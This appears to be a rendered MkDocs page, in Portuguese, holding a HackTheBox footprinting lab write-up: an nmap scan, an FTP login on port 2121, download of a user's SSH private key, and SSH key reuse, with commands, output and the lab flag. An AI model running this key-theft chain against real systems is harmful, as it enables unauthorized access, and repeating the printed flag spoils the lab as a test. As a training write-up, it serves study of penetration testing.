+          <li class="md-nav__item">
+  <a href="#credenciais-chaves-encontradas" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Credenciais / Chaves Encontradas
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#evidencia-acesso-ssh-e-flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Evidência — acesso SSH e flag
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#flags" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🚩 Flags
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#resumo-tecnico" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        📖 Resumo Técnico
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#licoes-aprendidas" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        💡 Lições Aprendidas
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="footprinting-tests-easy">🏴️ Footprinting Tests - Easy</h1>
+<blockquote>
+<p><strong>Dificuldade:</strong> Easy | <strong>SO:</strong> Linux | <strong>Plataforma:</strong> CPTS — Estudo de Footprinting</p>
+</blockquote>
+<div class="admonition info">
+<p class="admonition-title">Sobre esta página</p>
+<p>Writeup do laboratório de footprinting (máquina easy) do HackTheBox. Foco em
+enumeração de serviços e obtenção de acesso inicial por reuso de chave SSH.</p>
+</div>
+<hr />
+<h2 id="informacoes-gerais">📋 Informações Gerais</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Campo</th>
+<th style="text-align: left;">Valor</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><strong>Hostname</strong></td>
+<td style="text-align: left;"><code>NIXEASY</code></td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>IP</strong></td>
+<td style="text-align: left;"><code>10.129.14.129</code></td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>SO</strong></td>
+<td style="text-align: left;">Linux — Ubuntu 20.04.1 LTS</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Dificuldade</strong></td>
+<td style="text-align: left;">Easy</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Plataforma / Módulo</strong></td>
+<td style="text-align: left;">CPTS — Footprinting</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Domínio interno</strong></td>
+<td style="text-align: left;"><code>inlanefreight.htb</code></td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Data</strong></td>
+<td style="text-align: left;">01/06/2026</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Status</strong></td>
+<td style="text-align: left;">Finalizado</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="enumeracao-inicial">🔍 Enumeração Inicial</h2>
+<h3 id="portas-e-servicos-encontrados">Portas e Serviços Encontrados</h3>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Porta</th>
+<th style="text-align: left;">Serviço</th>
+<th style="text-align: left;">Versão / Banner</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;">21</td>
+<td style="text-align: left;">ftp</td>
+<td style="text-align: left;">ProFTPD — <code>ftp.int.inlanefreight.htb</code></td>
+</tr>
+<tr>
+<td style="text-align: left;">22</td>
+<td style="text-align: left;">ssh</td>
+<td style="text-align: left;">OpenSSH 8.2p1 Ubuntu</td>
+</tr>
+<tr>
+<td style="text-align: left;">53</td>
+<td style="text-align: left;">domain</td>
+<td style="text-align: left;">ISC BIND 9.16.1</td>
+</tr>
+<tr>
+<td style="text-align: left;">2121</td>
+<td style="text-align: left;">ftp</td>
+<td style="text-align: left;">ProFTPD — <em>Ceil's FTP</em></td>
+</tr>
+</tbody>
+</table>
+<h3 id="comando-de-enumeracao">Comando de Enumeração</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>sudo<span class="w"> </span>nmap<span class="w"> </span>-sS<span class="w"> </span>-sV<span class="w"> </span>--top-ports<span class="w"> </span><span class="m">1000</span><span class="w"> </span>-T4<span class="w"> </span><span class="m">10</span>.129.14.129
+</code></pre></div>
+<h3 id="saida-relevante-evidencia">Saída Relevante (evidência)</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>PORT<span class="w">     </span>STATE<span class="w"> </span>SERVICE<span class="w"> </span>VERSION
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="m">21</span>/tcp<span class="w">   </span>open<span class="w">  </span>ftp?
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="m">22</span>/tcp<span class="w">   </span>open<span class="w">  </span>ssh<span class="w">     </span>OpenSSH<span class="w"> </span><span class="m">8</span>.2p1<span class="w"> </span>Ubuntu<span class="w"> </span>4ubuntu0.2<span class="w"> </span><span class="o">(</span>Ubuntu<span class="w"> </span>Linux<span class="p">;</span><span class="w"> </span>protocol<span class="w"> </span><span class="m">2</span>.0<span class="o">)</span>
+<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="m">53</span>/tcp<span class="w">   </span>open<span class="w">  </span>domain<span class="w">  </span>ISC<span class="w"> </span>BIND<span class="w"> </span><span class="m">9</span>.16.1<span class="w"> </span><span class="o">(</span>Ubuntu<span class="w"> </span>Linux<span class="o">)</span>
+<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="m">2121</span>/tcp<span class="w"> </span>open<span class="w">  </span>ftp
+<a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>Service<span class="w"> </span>Info:<span class="w"> </span>OS:<span class="w"> </span>Linux<span class="p">;</span><span class="w"> </span>CPE:<span class="w"> </span>cpe:/o:linux:linux_kernel
+<a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>
+<a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a><span class="c1"># Fingerprints dos serviços nao reconhecidos:</span>
+<a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a><span class="c1">#  Port 21   -&gt; 220 ProFTPD Server (ftp.int.inlanefreight.htb)</span>
+<a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a><span class="c1">#  Port 2121 -&gt; 220 ProFTPD Server (Ceil&#39;s FTP)</span>
+</code></pre></div>
+<h3 id="descobertas">Descobertas</h3>
+<ul>
+<li>[x] Servidor FTP secundário numa porta <strong>não padrão (2121)</strong> — "Ceil's FTP"</li>
+<li>[x] Banner do FTP revela o <strong>domínio interno</strong> <code>inlanefreight.htb</code></li>
+<li>[x] SSH disponível (porta 22) → potencial reuso de chave</li>
+</ul>
+<hr />
+<h2 id="tecnicas-utilizadas">🎯 Técnicas Utilizadas</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">#</th>
+<th style="text-align: left;">Técnica</th>
+<th style="text-align: left;">Onde / Como foi aplicada</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;">1</td>
+<td style="text-align: left;">Enumeração de serviços (nmap)</td>
+<td style="text-align: left;">Identificação do FTP na porta não padrão 2121</td>
+</tr>
+<tr>
+<td style="text-align: left;">2</td>
+<td style="text-align: left;">Acesso a FTP</td>
+<td style="text-align: left;">Login no FTP 2121 como usuário <code>ceil</code></td>
+</tr>
+<tr>
+<td style="text-align: left;">3</td>
+<td style="text-align: left;">Exfiltração de chave privada SSH</td>
+<td style="text-align: left;">Download de <code>id_rsa</code> de <code>~/.ssh/</code> via FTP</td>
+</tr>
+<tr>
+<td style="text-align: left;">4</td>
+<td style="text-align: left;">Reuso de chave SSH</td>
+<td style="text-align: left;"><code>ssh -i id_rsa ceil@alvo</code> → shell como <code>ceil</code></td>
+</tr>
+<tr>
+<td style="text-align: left;">5</td>
+<td style="text-align: left;">Localização da flag</td>
+<td style="text-align: left;">Leitura de <code>/home/flag/flag.txt</code></td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="exploracao-acesso-inicial">🚀 Exploração / Acesso Inicial</h2>
+<h3 id="vetor-de-entrada">Vetor de Entrada</h3>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Campo</th>
+<th style="text-align: left;">Valor</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><strong>Vetor</strong></td>
+<td style="text-align: left;">FTP (2121) → chave SSH exposta</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Falha explorada</strong></td>
+<td style="text-align: left;">Chave privada <code>id_rsa</code> acessível/baixável via FTP</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Ferramentas</strong></td>
+<td style="text-align: left;">nmap, ftp, ssh</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Acesso obtido como</strong></td>
+<td style="text-align: left;"><code>ceil</code></td>
+</tr>
+</tbody>
+</table>
+<div class="admonition warning">
+<p class="admonition-title">Senha do FTP</p>
+<p>O login no FTP como <code>ceil</code> foi bem-sucedido (<code>230 User ceil logged in</code>), mas
+<strong>a senha utilizada não está registrada neste log</strong>.</p>
+</div>
+<h3 id="processo">Processo</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>1. Enumerar portas → identificar FTP em 2121 (Ceil&#39;s FTP)
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>2. Logar no FTP 2121 como ceil e navegar até .ssh/
+<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>3. Baixar id_rsa (e authorized_keys, id_rsa.pub)
+<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>4. chmod 600 id_rsa
+<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>5. ssh -i id_rsa ceil@10.129.14.129 → shell como ceil
+</code></pre></div>
+<h3 id="comandos-chave">Comandos-Chave</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>ftp<span class="w"> </span>ceil@10.129.14.129<span class="w"> </span><span class="m">2121</span>
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="c1"># ftp&gt; cd .ssh</span>
+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="c1"># ftp&gt; get id_rsa</span>
+<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="c1"># ftp&gt; get authorized_keys</span>
+<a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="c1"># ftp&gt; get id_rsa.pub</span>
+<a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>
+<a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>chmod<span class="w"> </span><span class="m">600</span><span class="w"> </span>id_rsa
+<a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>ssh<span class="w"> </span>-i<span class="w"> </span>id_rsa<span class="w"> </span>ceil@10.129.14.129
+</code></pre></div>
+<h3 id="evidencia-exfiltracao-da-chave-via-ftp">Evidência — exfiltração da chave via FTP</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>ftp&gt;<span class="w"> </span><span class="nb">cd</span><span class="w"> </span>.ssh
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="m">250</span><span class="w"> </span>CWD<span class="w"> </span><span class="nb">command</span><span class="w"> </span>successful
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>ftp&gt;<span class="w"> </span>ls
+<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>-rw-rw-r--<span class="w">   </span><span class="m">1</span><span class="w"> </span>ceil<span class="w">     </span>ceil<span class="w">          </span><span class="m">738</span><span class="w"> </span>Nov<span class="w"> </span><span class="m">10</span><span class="w">  </span><span class="m">2021</span><span class="w"> </span>authorized_keys
+<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>-rw-------<span class="w">   </span><span class="m">1</span><span class="w"> </span>ceil<span class="w">     </span>ceil<span class="w">         </span><span class="m">3381</span><span class="w"> </span>Nov<span class="w"> </span><span class="m">10</span><span class="w">  </span><span class="m">2021</span><span class="w"> </span>id_rsa
+<a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>-rw-r--r--<span class="w">   </span><span class="m">1</span><span class="w"> </span>ceil<span class="w">     </span>ceil<span class="w">          </span><span class="m">738</span><span class="w"> </span>Nov<span class="w"> </span><span class="m">10</span><span class="w">  </span><span class="m">2021</span><span class="w"> </span>id_rsa.pub
+<a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a>ftp&gt;<span class="w"> </span>get<span class="w"> </span>id_rsa
+<a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>local:<span class="w"> </span>id_rsa<span class="w"> </span>remote:<span class="w"> </span>id_rsa
+<a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a><span class="m">150</span><span class="w"> </span>Opening<span class="w"> </span>BINARY<span class="w"> </span>mode<span class="w"> </span>data<span class="w"> </span>connection<span class="w"> </span><span class="k">for</span><span class="w"> </span>id_rsa<span class="w"> </span><span class="o">(</span><span class="m">3381</span><span class="w"> </span>bytes<span class="o">)</span>
+<a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a><span class="m">226</span><span class="w"> </span>Transfer<span class="w"> </span><span class="nb">complete</span>
+<a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a><span class="m">3381</span><span class="w"> </span>bytes<span class="w"> </span>received<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">00</span>:00<span class="w"> </span><span class="o">(</span><span class="m">405</span>.52<span class="w"> </span>KiB/s<span class="o">)</span>
+</code></pre></div>
+<h3 id="tentativas-que-nao-funcionaram">Tentativas que NÃO funcionaram</h3>
+<ul>
+<li><code>nano</code> / <code>vi</code> / <code>vim authorized_keys</code> <strong>dentro do cliente FTP</strong> → <code>?Invalid command.</code></li>
+<li><code>cd .profile</code> e <code>cd authorized_keys</code> → <code>550 ...: Not a directory</code></li>
+</ul>
+<div class="admonition tip">
+<p class="admonition-title">Lição</p>
+<p>O cliente FTP interativo não edita arquivos remotos — só transfere. O caminho
+correto é <code>get</code> o arquivo e abri-lo localmente.</p>
+</div>
+<hr />
+<h2 id="shell-e-pos-acesso">🐚 Shell e Pós-Acesso</h2>
+<p>Acesso obtido como <code>ceil</code> via SSH com a chave exfiltrada (Ubuntu 20.04.1 LTS).</p>
+<h3 id="usuarios-encontrados-home">Usuários encontrados (<code>/home</code>)</h3>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Usuário</th>
+<th style="text-align: left;">Observação</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><code>ceil</code></td>
+<td style="text-align: left;">usuário acessado</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>cry0l1t3</code></td>
+<td style="text-align: left;">presente em <code>/home</code></td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>flag</code></td>
+<td style="text-align: left;">diretório que contém a flag</td>
+</tr>
+</tbody>
+</table>
+<h3 id="credenciais-chaves-encontradas">Credenciais / Chaves Encontradas</h3>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Tipo</th>
+<th style="text-align: left;">Valor / Local</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;">Chave SSH privada</td>
+<td style="text-align: left;"><code>id_rsa</code> baixado de <code>~/.ssh/</code> do <code>ceil</code> via FTP 2121</td>
+</tr>
+</tbody>
+</table>
+<h3 id="evidencia-acesso-ssh-e-flag">Evidência — acesso SSH e flag</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>└──╼<span class="w"> </span><span class="o">[</span>★<span class="o">]</span>$<span class="w"> </span>chmod<span class="w"> </span><span class="m">600</span><span class="w"> </span>id_rsa
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>└──╼<span class="w"> </span><span class="o">[</span>★<span class="o">]</span>$<span class="w"> </span>ssh<span class="w"> </span>-i<span class="w"> </span>id_rsa<span class="w"> </span>ceil@10.129.14.129
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>Welcome<span class="w"> </span>to<span class="w"> </span>Ubuntu<span class="w"> </span><span class="m">20</span>.04.1<span class="w"> </span>LTS<span class="w"> </span><span class="o">(</span>GNU/Linux<span class="w"> </span><span class="m">5</span>.4.0-90-generic<span class="w"> </span>x86_64<span class="o">)</span>
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>Last<span class="w"> </span>login:<span class="w"> </span>Wed<span class="w"> </span>Nov<span class="w"> </span><span class="m">10</span><span class="w"> </span><span class="m">05</span>:48:02<span class="w"> </span><span class="m">2021</span><span class="w"> </span>from<span class="w"> </span><span class="m">10</span>.10.14.20
+<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>
+<a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>ceil@NIXEASY:~$<span class="w"> </span><span class="nb">cd</span><span class="w"> </span>/home/flag/
+<a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a>ceil@NIXEASY:/home/flag$<span class="w"> </span>cat<span class="w"> </span>flag.txt
+<a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>HTB<span class="o">{</span>7nrzise7hednrxihskjed7nzrgkweunj47zngrhdbkjhgdfbjkc7hgj<span class="o">}</span>
+</code></pre></div>
+<hr />
+<h2 id="flags">🚩 Flags</h2>
+<ul>
+<li>[x] Flag capturada</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Flag</th>
+<th style="text-align: left;">Local</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><code>HTB{7nrzise7hednrxihskjed7nzrgkweunj47zngrhdbkjhgdfbjkc7hgj}</code></td>
+<td style="text-align: left;"><code>/home/flag/flag.txt</code></td>
+</tr>
+</tbody>
+</table>
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>A flag foi obtida em <code>/home/flag/</code>. Não houve acesso a <code>/root</code> neste log —
+portanto <strong>não há root flag</strong> registrada.</p>
+</div>
+<hr />
+<h2 id="resumo-tecnico">📖 Resumo Técnico</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Campo</th>
+<th style="text-align: left;">Valor</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><strong>Causa raiz</strong></td>
+<td style="text-align: left;">Chave privada SSH exposta através de um serviço FTP acessível</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Cadeia de ataque</strong></td>
+<td style="text-align: left;">Enumeração (nmap) → FTP 2121 como <code>ceil</code> → download de <code>id_rsa</code> → SSH como <code>ceil</code> → flag em <code>/home/flag/</code></td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Acesso final</strong></td>
+<td style="text-align: left;"><code>ceil</code> (usuário)</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="licoes-aprendidas">💡 Lições Aprendidas</h2>
+<ul>
+<li><strong>O que funcionou:</strong> reuso da <code>id_rsa</code> exfiltrada do FTP para autenticar via SSH.</li>
+<li><strong>O que atrasou:</strong> tentar editar arquivos dentro do cliente FTP (<code>nano</code>/<code>vi</code>/<code>vim</code>) — não suportado.</li>
+<li><strong>Comandos para revisar depois:</strong> enumeração de serviços em <strong>portas altas/não padrão</strong> (o FTP relevante estava na 2121, não na 21).</li>
+<li><strong>Técnicas para estudar melhor:</strong> após obter qualquer acesso a arquivos, sempre conferir <code>~/.ssh/</code> por chaves privadas legíveis.</li>
+</ul>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.sections", "navigation.top", "search.highlight", "content.code.copy"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  </body>
+</html>
